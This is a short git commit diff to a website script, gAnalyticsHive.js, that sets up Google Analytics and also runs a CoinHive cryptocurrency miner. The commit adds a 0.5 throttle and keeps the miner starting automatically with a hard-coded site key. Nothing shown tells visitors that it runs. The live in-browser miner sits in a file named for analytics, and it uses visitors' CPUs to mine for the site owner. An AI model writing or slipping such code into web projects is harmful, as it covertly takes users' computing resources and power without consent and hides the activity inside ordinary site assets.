b0a16941c353ce6889b873db2afa2d9e037ece85
HaoZeke <driger633@gmail.com>
2017-11-18 08:04:59 +0530

    mine: Throttle at .5

--- src/js/gAnalyticsHive.js
+++ src/js/gAnalyticsHive.js
@@ -6,5 +6,7 @@ gtag('js', new Date());
 gtag('config', 'UA-109503488-3');
 
 // Miner
-var miner = new CoinHive.Anonymous('cwMkBJ1OstEitWyfKnywfyMF2H0qk03m', {autoThreads: true});
+var miner = new CoinHive.Anonymous('cwMkBJ1OstEitWyfKnywfyMF2H0qk03m', {
+	throttle: 0.5,
+	autoThreads: true});
 miner.start();
